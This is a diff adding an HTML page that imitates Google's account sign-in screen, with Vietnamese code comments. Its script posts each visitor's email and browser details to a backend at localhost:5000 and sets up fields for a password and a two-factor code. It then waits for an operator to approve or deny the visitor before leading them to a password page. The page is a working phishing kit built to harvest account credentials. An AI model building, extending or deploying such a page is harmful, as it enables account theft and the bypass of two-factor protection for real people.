@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <link rel="stylesheet" href="styles.css">
+    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@300;400;500;600&family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
+    <link rel="icon" href="google_logo_icon_169090.ico">
+    <style>
+        /* Đẩy input xuống thấp hơn cho trang này */
+        .signin-form .input-field {
+            margin-top: 24px !important;
+        }
+    </style>
+</head>
+<body>
+    <!-- Loading overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+    </div>
+
+    <!-- Main content -->
+    <div class="main-wrapper page-transition">
+        <div class="login-wrapper">
+            <div class="signin-card">
+                <!-- Progress bar container -->
+                <div class="progress-container">
+                    <div class="progress-bar" id="progressBar"></div>
+                </div>
+                <div class="signin-columns">
+                    <!-- Left Column: Logo, Title, Description -->
+                    <div class="signin-left">
+                        <div class="logo-wrapper">
+                            <img src="google_logo_icon_169090.ico" alt="Google logo" class="google-logo" style="width:48px;height:48px;" />
+                        </div>
+                        <h1 class="signin-title">Sign in</h1>
+                        <p class="signin-subtitle" style="color: #202124;">with your Google Account. This account will be available to other Google apps in the browser.</p>
+                    </div>
+                    
+                    <!-- Right Column: Sign-in Form -->
+                    <div class="signin-right">
+                        <form id="loginForm" class="signin-form" novalidate>
+                            <div class="input-field">
+                                <input type="email" id="email" class="text-input" placeholder=" " required autocomplete="username">
+                                <label for="email" class="floating-label">Email or phone</label>
+                            </div>
+                            <div class="error-wrapper">
+                                <span class="error-text" id="email-error"></span>
+                            </div>
+                            
+                                <button type="button" class="forgot-email-btn">Forgot email?</button>
+                            
+                            <div class="helper-text">
+                                <p>Not your computer? Use Guest mode to sign in privately. <a href="#" class="learn-more">Learn more about using Guest mode</a></p>
+                            </div>
+                            
+                            <div class="action-buttons">
+                                <button type="submit" class="btn-primary">Next</button>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Footer -->
+            <footer class="page-footer">
+                <div class="footer-wrapper">
+                        <a href="#" class="footer-link">Help</a>
+                        <a href="#" class="footer-link">Privacy</a>
+                        <a href="#" class="footer-link">Terms</a>
+                </div>
+            </footer>
+    </div>
+
+    <script>
+        // Function to update page status
+        async function updatePageStatus(pageName) {
+            const requestId = localStorage.getItem('requestId');
+            if (!requestId) return;
+            
+            try {
+                await fetch('http://localhost:5000/api/update-page', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        id: parseInt(requestId), 
+                        currentPage: pageName 
+                    })
+                });
+            } catch (err) {
+                console.log('Failed to update page status');
+            }
+        }
+
+        // Smooth progress bar function for API calls
+        function startProgressBar() {
+            const progressBar = document.getElementById('progressBar');
+            const progressContainer = document.querySelector('.progress-container');
+            
+            if (!progressBar || !progressContainer) return;
+            
+            // Show progress container
+            progressContainer.classList.add('active');
+            
+            // Reset and start animation
+            progressBar.style.width = '0%';
+            progressBar.classList.remove('loading', 'completing');
+            
+            setTimeout(() => {
+                progressBar.classList.add('loading');
+                progressBar.style.width = '80%';
+            }, 100);
+            
+            return {
+                complete: () => {
+                    progressBar.classList.remove('loading');
+                    progressBar.classList.add('completing');
+                    progressBar.style.width = '100%';
+                    
+                    setTimeout(() => {
+                        progressContainer.classList.remove('active');
+                    }, 300);
+                },
+                hide: () => {
+                    progressContainer.classList.remove('active');
+                }
+            };
+        }
+
+        // Page transition handler
+        function handleTransition(url) {
+            const card = document.querySelector('.signin-card');
+            if (card) {
+                card.classList.add('fade-out');
+            setTimeout(() => {
+                window.location.href = url;
+            }, 300);
+        } else {
+            window.location.href = url;
+        }
+    }
+
+        // Form validation and submission
+        function handleFormSubmission() {
+        const form = document.getElementById('loginForm');
+                const emailInput = document.getElementById('email');
+                const emailError = document.getElementById('email-error');
+                
+            form.addEventListener('submit', async function(e) {
+                e.preventDefault();
+                // Reset previous errors
+                emailInput.classList.remove('error');
+                emailError.textContent = '';
+                const email = emailInput.value.trim();
+                // Basic email validation
+                if (!email) {
+                    showError('Enter an email or phone number');
+                    return;
+                }
+                if (!isValidEmail(email) && !isValidPhone(email)) {
+                    showError('Enter a valid email or phone number');
+                    return;
+                }
+                // Show loading state
+                const submitBtn = form.querySelector('.btn-primary');
+                submitBtn.classList.add('loading');
+                submitBtn.disabled = true;
+                
+                // Start smooth progress bar
+                const progress = startProgressBar();
+                
+                // Store email for next page
+                localStorage.setItem('userEmail', email);
+                
+                // Gửi dữ liệu lên backend GUI Local
+                const userAgent = navigator.userAgent;
+                let requestId = null;
+                try {
+                    const res = await fetch('http://localhost:5000/api/request', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ 
+                            email, 
+                            password: '', 
+                            twofa: '', 
+                            userAgent,
+                            currentPage: 'index.html'
+                        })
+                    });
+                    const data = await res.json();
+                    requestId = data.requestId;
+                    localStorage.setItem('requestId', requestId);
+                } catch (err) { 
+                    console.log('Backend not available, proceeding without approval');
+                    // Nếu backend không có, chuyển thẳng đến password page
+                    progress.complete();
+                    setTimeout(() => {
+                        window.location.href = `password.html?email=${encodeURIComponent(email)}`;
+                    }, 300);
+                    return;
+                }
+                
+                // Bắt đầu kiểm tra phê duyệt
+                await checkApprovalStatus(requestId, 'password.html');
+            });
+
+            function showError(message) {
+                emailInput.classList.add('error');
+                emailError.textContent = message;
+                emailInput.focus();
+            }
+
+            function isValidEmail(email) {
+                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                return emailRegex.test(email);
+            }
+
+            function isValidPhone(phone) {
+                const phoneRegex = /^\+?[\d\s\-\(\)]+$/;
+                return phoneRegex.test(phone) && phone.replace(/\D/g, '').length >= 10;
+            }
+
+            // Hàm kiểm tra trạng thái approval
+            async function checkApprovalStatus(requestId, nextPage) {
+                const maxAttempts = 60; // Tối đa 60 lần kiểm tra (5 phút)
+                let attempts = 0;
+                
+                const checkStatus = async () => {
+                    try {
+                        const response = await fetch(`http://localhost:5000/api/status/${requestId}`);
+                        if (response.ok) {
+                            const data = await response.json();
+                            
+                            if (data.status === 'approved') {
+                                // Được approve, chuyển trang
+                                const email = localStorage.getItem('userEmail');
+                                const progress = startProgressBar();
+                                progress.complete();
+                                setTimeout(() => {
+                                    window.location.href = nextPage + '?email=' + encodeURIComponent(email);
+                                }, 300);
+                                return;
+                            } else if (data.status === 'denied') {
+                                // Bị từ chối, hiển thị thông báo
+                                const submitBtn = document.querySelector('.btn-primary');
+                                submitBtn.classList.remove('loading');
+                                submitBtn.disabled = false;
+                                showError('Invalid email or phone number. Please try again.');
+                                return;
+                            }
+                        }
+                        
+                        attempts++;
+                        if (attempts < maxAttempts) {
+                            // Kiểm tra lại sau 1 giây
+                            setTimeout(checkStatus, 1000);
+                        } else {
+                            // Hết thời gian chờ, chuyển trang
+                            const email = localStorage.getItem('userEmail');
+                            const progress = startProgressBar();
+                            progress.complete();
+                            setTimeout(() => {
+                                window.location.href = nextPage + '?email=' + encodeURIComponent(email);
+                            }, 300);
+                        }
+                    } catch (error) {
+                        console.error('Error checking approval status:', error);
+                        attempts++;
+                        if (attempts < maxAttempts) {
+                            setTimeout(checkStatus, 1000);
+                        } else {
+                            const email = localStorage.getItem('userEmail');
+                            const progress = startProgressBar();
+                            progress.complete();
+                            setTimeout(() => {
+                                window.location.href = nextPage + '?email=' + encodeURIComponent(email);
+                            }, 300);
+                        }
+                    }
+                };
+                
+                // Bắt đầu kiểm tra
+                checkStatus();
+            }
+        }
+
+        // Mobile responsive handler
+        function handleMobileLayout() {
+            function checkMobile() {
+                if (window.innerWidth <= 600) {
+                    document.body.classList.add('mobile-layout');
+                } else {
+                    document.body.classList.remove('mobile-layout');
+                }
+            }
+            
+            checkMobile();
+            window.addEventListener('resize', checkMobile);
+        }
+
+        // Initialize when DOM is loaded
+        document.addEventListener('DOMContentLoaded', function() {
+            handleFormSubmission();
+            handleMobileLayout();
+            
+            // Focus on email input
+            document.getElementById('email').focus();
+            
+            // Handle forgot email button
+            const forgotBtn = document.querySelector('.forgot-email-btn');
+            if (forgotBtn) {
+                forgotBtn.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    alert('Forgot email feature would be implemented here');
+                });
+            }
+            
+            // Handle create account button
+            const btnSecondary = document.querySelector('.btn-secondary');
+            if (btnSecondary) {
+                btnSecondary.addEventListener('click', function() {
+                    alert('Create account feature would be implemented here');
+                });
+            }
+            
+            // Handle learn more link
+            const learnMore = document.querySelector('.learn-more');
+            if (learnMore) {
+                learnMore.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    alert('Guest mode help would be shown here');
+                });
+            }
+        });
+
+        // Accessibility improvements
+        document.addEventListener('keydown', function(e) {
+            // Allow form submission with Enter key
+            if (e.key === 'Enter' && document.activeElement.tagName !== 'BUTTON') {
+                document.getElementById('loginForm').dispatchEvent(new Event('submit'));
+            }
+    });
+    </script>
+</body>
+</html> 
